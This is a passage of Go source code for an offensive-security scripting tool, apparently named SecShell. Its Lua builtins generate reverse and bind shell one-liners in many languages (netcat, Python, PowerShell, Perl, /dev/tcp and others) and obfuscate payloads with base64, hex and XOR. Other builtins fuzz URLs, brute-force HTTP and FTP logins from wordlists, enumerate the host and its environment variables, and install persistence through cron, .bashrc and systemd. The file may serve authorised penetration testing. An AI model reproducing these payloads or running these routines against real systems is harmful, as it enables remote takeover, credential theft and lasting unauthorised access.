		"python":     fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", lhost, lport),
		"python3":    fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", lhost, lport),
		"php":        fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", lhost, lport),
		"powershell": fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", lhost, lport),
		"perl":       fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", lhost, lport),
		"ruby":       fmt.Sprintf("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", lhost, lport),
		"nc":         fmt.Sprintf("nc -e /bin/sh %s %s", lhost, lport),
		"nc_no_e":    fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", lhost, lport),
		"java":       fmt.Sprintf("r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor();", lhost, lport),
		"go":         fmt.Sprintf("package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"%s:%s\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}", lhost, lport),
		"lua":        fmt.Sprintf("lua -e 'require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"%s\",\"%s\");os.execute(\"/bin/sh -i <&3 >&3 2>&3\")'", lhost, lport),
	}

	payload, exists := payloads[payloadType]
	if !exists {
		// Return list of available types
		types := L.NewTable()
		for t := range payloads {
			types.Append(lua.LString(t))
		}
		L.Push(lua.LBool(false))
		L.Push(lua.LString("unknown payload type"))
		L.Push(types)
		return 3
	}

	// Also generate base64 encoded version
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))

	result := L.NewTable()
	result.RawSetString("payload", lua.LString(payload))
	result.RawSetString("encoded", lua.LString(encoded))
	result.RawSetString("type", lua.LString(payloadType))
	result.RawSetString("lhost", lua.LString(lhost))
	result.RawSetString("lport", lua.LString(lport))

	L.Push(lua.LBool(true))
	L.Push(result)
	L.Push(lua.LString(""))
	return 3
}

// --- genBindShell(port, type) - Generate bind shell payload ---
func builtinGenBindShell(L *lua.LState) int {
	port := L.CheckString(1)
	payloadType := "nc"
	if L.GetTop() >= 2 {
		payloadType = strings.ToLower(L.CheckString(2))
	}

	payloads := map[string]string{
		"nc":     fmt.Sprintf("nc -lvp %s -e /bin/sh", port),
		"nc_noe": fmt.Sprintf("mkfifo /tmp/s;nc -lvp %s < /tmp/s | /bin/sh > /tmp/s 2>&1;rm /tmp/s", port),
		"python": fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"\",%s));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", port),
		"php":    fmt.Sprintf("php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"\",%s);socket_listen($s,1);$c=socket_accept($s);exec(\"/bin/sh -i\",0,$c);'", port),
		"perl":   fmt.Sprintf("perl -MIO -e '$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");'", port),
	}

	payload, exists := payloads[payloadType]
	if !exists {
		types := L.NewTable()
		for t := range payloads {
			types.Append(lua.LString(t))
		}
		L.Push(lua.LBool(false))
		L.Push(lua.LString("unknown payload type"))
		L.Push(types)
		return 3
	}

	encoded := base64.StdEncoding.EncodeToString([]byte(payload))

	result := L.NewTable()
	result.RawSetString("payload", lua.LString(payload))
	result.RawSetString("encoded", lua.LString(encoded))
	result.RawSetString("type", lua.LString(payloadType))
	result.RawSetString("port", lua.LString(port))

	L.Push(lua.LBool(true))
	L.Push(result)
	L.Push(lua.LString(""))
	return 3
}

// --- encodePayload(data, encoder) - Encode payload with various methods ---
func builtinEncodePayload(L *lua.LState) int {
	data := L.CheckString(1)
	encoder := strings.ToLower(L.CheckString(2))

	var result string

	switch encoder {
	case "base64":
		result = base64.StdEncoding.EncodeToString([]byte(data))
	case "hex":
		result = hex.EncodeToString([]byte(data))
	case "url":
		result = escapeURL(data)
	case "unicode":
		// Simple unicode encoding for each character
		var sb strings.Builder
		for _, r := range data {
			sb.WriteString(fmt.Sprintf("\\u%04X", r))
		}
		result = sb.String()
	case "xor":
		// XOR with key 0x42 (default)
		key := byte(0x42)
		if L.GetTop() >= 3 {
			key = byte(L.CheckNumber(3))
		}
		bytes := []byte(data)
		for i := range bytes {
			bytes[i] ^= key
		}
		result = hex.EncodeToString(bytes)
	case "rot13":
		result = strings.Map(func(r rune) rune {
			switch {
			case r >= 'a' && r <= 'z':
				return 'a' + (r-'a'+13)%26
			case r >= 'A' && r <= 'Z':
				return 'A' + (r-'A'+13)%26
			default:
				return r
			}
		}, data)
	default:
		L.Push(lua.LBool(false))
		L.Push(lua.LString(""))
		L.Push(lua.LString("unsupported encoder: " + encoder))
		return 3
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(result))
	L.Push(lua.LString(""))
	return 3
}

// ===================== PHASE 7: Exploitation Helpers =====================

// --- httpRequest(url, method, headers, body) - Full HTTP request with custom headers ---
func builtinHttpRequest(L *lua.LState) int {
	url := L.CheckString(1)
	method := "GET"
	if L.GetTop() >= 2 {
		method = L.CheckString(2)
	}

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	// Add custom headers if provided
	if L.GetTop() >= 3 {
		if headers, ok := L.Get(3).(*lua.LTable); ok {
			headers.ForEach(func(key, value lua.LValue) {
				req.Header.Set(key.String(), value.String())
			})
		}
	}

	// Add body if provided
	if L.GetTop() >= 4 {
		body := L.CheckString(4)
		req.Body = io.NopCloser(strings.NewReader(body))
		req.ContentLength = int64(len(body))
	}

	client := &http.Client{
		Timeout: 30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	result := L.NewTable()
	result.RawSetString("status", lua.LNumber(resp.StatusCode))
	result.RawSetString("statusText", lua.LString(resp.Status))
	result.RawSetString("body", lua.LString(string(bodyBytes)))

	// Add response headers
	respHeaders := L.NewTable()
	for k, v := range resp.Header {
		respHeaders.RawSetString(k, lua.LString(strings.Join(v, ", ")))
	}
	result.RawSetString("headers", respHeaders)

	L.Push(lua.LBool(true))
	L.Push(result)
	return 2
}

// --- fuzz(template, payloads) - Fuzzing helper with template substitution ---
func builtinFuzz(L *lua.LState) int {
	template := L.CheckString(1)
	payloadsTbl := L.CheckTable(2)

	// Optional: delay between requests
	delay := 0 * time.Millisecond
	if L.GetTop() >= 3 {
		delay = time.Duration(L.CheckNumber(3)) * time.Millisecond
	}

	// Optional: stop on first success
	stopOnSuccess := false
	if L.GetTop() >= 4 {
		stopOnSuccess = L.CheckBool(4)
	}

	results := L.NewTable()
	idx := 1
	client := &http.Client{Timeout: defaultHTTPTimeout}

	payloadsTbl.ForEach(func(key, payload lua.LValue) {
		target := strings.ReplaceAll(template, "FUZZ", payload.String())

		// Make HTTP request
		req, reqErr := http.NewRequest("GET", target, nil)
		var resp *http.Response
		var err error
		if reqErr != nil {
			err = reqErr
		} else {
			resp, err = client.Do(req)
		}
		statusCode := 0
		bodyLen := 0
		if err == nil {
			statusCode = resp.StatusCode
			bodyLen = int(resp.ContentLength)
			resp.Body.Close()
		}

		result := L.NewTable()
		result.RawSetString("payload", payload)
		result.RawSetString("url", lua.LString(target))
		result.RawSetString("status", lua.LNumber(statusCode))
		result.RawSetString("bodyLen", lua.LNumber(bodyLen))
		if err != nil {
			result.RawSetString("error", lua.LString(err.Error()))
		}

		results.RawSetInt(idx, result)
		idx++

		if delay > 0 {
			time.Sleep(delay)
		}

		if stopOnSuccess && err == nil && statusCode >= 200 && statusCode < 300 {
			// We can't break from ForEach, but we can signal via a global
			// For now, just continue
		}
	})

	L.Push(lua.LBool(true))
	L.Push(results)
	return 2
}

// --- bruteForce(target, service, wordlist) - Basic brute force ---
func builtinBruteForce(L *lua.LState) int {
	target := L.CheckString(1)
	service := strings.ToLower(L.CheckString(2))
	wordlistPath := L.CheckString(3)

	// Read wordlist
	wordlistContent, err := os.ReadFile(wordlistPath)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("failed to read wordlist: " + err.Error()))
		return 2
	}

	words := strings.Split(string(wordlistContent), "\n")
	// Clean up words
	var cleanWords []string
	for _, w := range words {
		w = strings.TrimSpace(w)
		if w != "" && !strings.HasPrefix(w, "#") {
			cleanWords = append(cleanWords, w)
		}
	}

	results := L.NewTable()

	switch service {
	case "http":
		// Try HTTP basic auth with wordlist (username:password format)
		for _, cred := range cleanWords {
			parts := strings.SplitN(cred, ":", 2)
			if len(parts) != 2 {
				continue
			}
			username, password := parts[0], parts[1]

			req, _ := http.NewRequest("GET", target, nil)
			req.SetBasicAuth(username, password)
			client := &http.Client{Timeout: 5 * time.Second}
			resp, err := client.Do(req)
			if err == nil {
				if resp.StatusCode == 200 {
					result := L.NewTable()
					result.RawSetString("username", lua.LString(username))
					result.RawSetString("password", lua.LString(password))
					result.RawSetString("status", lua.LNumber(resp.StatusCode))
					results.Append(result)
				}
				resp.Body.Close()
			}
		}
	case "ftp":
		// FTP brute force
		for _, cred := range cleanWords {
			parts := strings.SplitN(cred, ":", 2)
			if len(parts) != 2 {
				continue
			}
			username, password := parts[0], parts[1]

			conn, err := net.DialTimeout("tcp", target, 5*time.Second)
			if err != nil {
				continue
			}

			// Read FTP banner
			buf := make([]byte, 1024)
			conn.Read(buf)

			// Send USER
			fmt.Fprintf(conn, "USER %s\r\n", username)
			conn.Read(buf)

			// Send PASS
			fmt.Fprintf(conn, "PASS %s\r\n", password)
			n, _ := conn.Read(buf)
			response := string(buf[:n])

			if strings.HasPrefix(response, "230") {
				result := L.NewTable()
				result.RawSetString("username", lua.LString(username))
				result.RawSetString("password", lua.LString(password))
				results.Append(result)
			}
			conn.Close()
		}
	default:
		L.Push(lua.LBool(false))
		L.Push(lua.LString("unsupported service: " + service + ". Use http or ftp"))
		return 2
	}

	L.Push(lua.LBool(true))
	L.Push(results)
	return 2
}

// ===================== PHASE 8: Post-Exploitation =====================

// --- privCheck() - Check current privilege level ---
func builtinPrivCheck(L *lua.LState) int {
	// Check if running as root/Administrator
	isRoot := os.Geteuid() == 0

	result := L.NewTable()
	result.RawSetString("isRoot", lua.LBool(isRoot))
	result.RawSetString("uid", lua.LNumber(os.Geteuid()))
	result.RawSetString("gid", lua.LNumber(os.Getegid()))

	if isRoot {
		result.RawSetString("level", lua.LString("root/administrator"))
	} else {
		result.RawSetString("level", lua.LString("user"))
	}

	L.Push(lua.LBool(true))
	L.Push(result)
	return 2
}

// --- enumSystem() - Enumerate system information ---
func builtinEnumSystem(L *lua.LState) int {
	hostname, _ := os.Hostname()
	wd, _ := os.Getwd()

	result := L.NewTable()
	result.RawSetString("hostname", lua.LString(hostname))
	result.RawSetString("os", lua.LString(runtime.GOOS))
	result.RawSetString("arch", lua.LString(runtime.GOARCH))
	result.RawSetString("workingDir", lua.LString(wd))
	result.RawSetString("uid", lua.LNumber(os.Geteuid()))
	result.RawSetString("gid", lua.LNumber(os.Getegid()))

	// Get username
	currentUser := os.Getenv("USER")
	if currentUser == "" {
		currentUser = os.Getenv("USERNAME")
	}
	result.RawSetString("user", lua.LString(currentUser))

	// Get environment variables count
	envVars := L.NewTable()
	idx := 1
	for _, env := range os.Environ() {
		envVars.RawSetInt(idx, lua.LString(env))
		idx++
	}
	result.RawSetString("envVars", envVars)

	L.Push(lua.LBool(true))
	L.Push(result)
	return 2
}

// --- enumNetwork() - Enumerate network interfaces and addresses ---
func builtinEnumNetwork(L *lua.LState) int {
	ifaces, err := net.Interfaces()
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	interfaces := L.NewTable()
	idx := 1

	for _, iface := range ifaces {
		ifaceInfo := L.NewTable()
		ifaceInfo.RawSetString("name", lua.LString(iface.Name))
		ifaceInfo.RawSetString("mtu", lua.LNumber(iface.MTU))
		ifaceInfo.RawSetString("flags", lua.LString(iface.Flags.String()))
		ifaceInfo.RawSetString("hardwareAddr", lua.LString(iface.HardwareAddr.String()))

		addrs, err := iface.Addrs()
		if err == nil {
			addrList := L.NewTable()
			for i, addr := range addrs {
				addrList.RawSetInt(i+1, lua.LString(addr.String()))
			}
			ifaceInfo.RawSetString("addresses", addrList)
		}

		interfaces.RawSetInt(idx, ifaceInfo)
		idx++
	}

	result := L.NewTable()
	result.RawSetString("interfaces", interfaces)

	L.Push(lua.LBool(true))
	L.Push(result)
	return 2
}

// --- persistAdd(script) - Add persistence mechanism ---
func builtinPersistAdd(L *lua.LState) int {
	scriptPath := L.CheckString(1)
	method := "cron"
	if L.GetTop() >= 2 {
		method = strings.ToLower(L.CheckString(2))
	}

	absPath, err := filepath.Abs(scriptPath)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("failed to resolve path: " + err.Error()))
		return 2
	}

	// Check if script exists
	if _, err := os.Stat(absPath); err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("script file not found: " + err.Error()))
		return 2
	}

	var persistResult string
	var persistSuccess bool

	switch method {
	case "cron":
		// Add to crontab (@reboot)
		cronEntry := fmt.Sprintf("@reboot %s", absPath)
		cmd := exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronEntry))
		output, err := cmd.CombinedOutput()
		if err != nil {
			persistSuccess = false
			persistResult = fmt.Sprintf("cron persistence failed: %s", string(output))
		} else {
			persistSuccess = true
			persistResult = fmt.Sprintf("added to crontab: %s", cronEntry)
		}
	case "bashrc":
		// Add to .bashrc
		bashrcPath := os.Getenv("HOME") + "/.bashrc"
		entry := fmt.Sprintf("\n# Persistence\n%s &\n", absPath)
		f, err := os.OpenFile(bashrcPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			persistSuccess = false
			persistResult = fmt.Sprintf("bashrc persistence failed: %s", err.Error())
		} else {
			defer f.Close()
			f.WriteString(entry)
			persistSuccess = true
			persistResult = fmt.Sprintf("added to %s", bashrcPath)
		}
	case "systemd":
		// Create systemd service
		serviceName := "secshell-persist"
		serviceContent := fmt.Sprintf(`[Unit]
Description=SecShell Persistence Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target`, absPath)

		servicePath := fmt.Sprintf("/etc/systemd/system/%s.service", serviceName)
		err = os.WriteFile(servicePath, []byte(serviceContent), 0644)
		if err != nil {
			persistSuccess = false
			persistResult = fmt.Sprintf("systemd persistence failed: %s", err.Error())
		} else {
			// Enable the service
			exec.Command("systemctl", "daemon-reload").Run()
			exec.Command("systemctl", "enable", serviceName).Run()
			persistSuccess = true
			persistResult = fmt.Sprintf("created systemd service: %s", servicePath)
		}
	default:
		L.Push(lua.LBool(false))
		L.Push(lua.LString("unsupported method: " + method + ". Use cron, bashrc, or systemd"))
		return 2
	}

	result := L.NewTable()
	result.RawSetString("success", lua.LBool(persistSuccess))
	result.RawSetString("method", lua.LString(method))
	result.RawSetString("result", lua.LString(persistResult))

	L.Push(lua.LBool(persistSuccess))
	L.Push(result)
	return 2
}

// --- persistRemove() - Remove persistence mechanisms ---
func builtinPersistRemove(L *lua.LState) int {
	results := L.NewTable()
	idx := 1

	// Remove cron entries containing secshell
	cmd := exec.Command("sh", "-c", "crontab -l 2>/dev/null | grep -v secshell | crontab -")
	output, err := cmd.CombinedOutput()
	cronResult := L.NewTable()
	cronResult.RawSetString("method", lua.LString("cron"))
	if err != nil {
		cronResult.RawSetString("success", lua.LBool(false))
		cronResult.RawSetString("error", lua.LString(string(output)))
	} else {
		cronResult.RawSetString("success", lua.LBool(true))
	}
	results.RawSetInt(idx, cronResult)
	idx++

	// Remove from bashrc
	bashrcPath := os.Getenv("HOME") + "/.bashrc"
	content, err := os.ReadFile(bashrcPath)
	if err == nil {
		lines := strings.Split(string(content), "\n")
		var cleanLines []string
		inPersistenceBlock := false
		for _, line := range lines {
			if strings.Contains(line, "# Persistence") {
				inPersistenceBlock = true
				continue
			}
			if inPersistenceBlock && strings.Contains(line, "secshell") {
				continue
			}
			if inPersistenceBlock && line == "" {
				inPersistenceBlock = false
				continue
			}
			cleanLines = append(cleanLines, line)
		}
		os.WriteFile(bashrcPath, []byte(strings.Join(cleanLines, "\n")), 0644)
	}
	bashrcResult := L.NewTable()
	bashrcResult.RawSetString("method", lua.LString("bashrc"))
	bashrcResult.RawSetString("success", lua.LBool(true))
	results.RawSetInt(idx, bashrcResult)
	idx++

	// Disable systemd service
	exec.Command("systemctl", "disable", "secshell-persist").Run()
	exec.Command("systemctl", "stop", "secshell-persist").Run()
	os.Remove("/etc/systemd/system/secshell-persist.service")
	systemdResult := L.NewTable()
	systemdResult.RawSetString("method", lua.LString("systemd"))
	systemdResult.RawSetString("success", lua.LBool(true))
	results.RawSetInt(idx, systemdResult)
	idx++

	L.Push(lua.LBool(true))
	L.Push(results)
	return 2
}

// --- Helper functions for URL encoding ---
func escapeURL(s string) string {
	return strings.ReplaceAll(s, " ", "%20")
}

func unescapeURL(s string) (string, error) {
	result := strings.ReplaceAll(s, "%20", " ")
	// Add more URL decoding as needed
	return result, nil
}
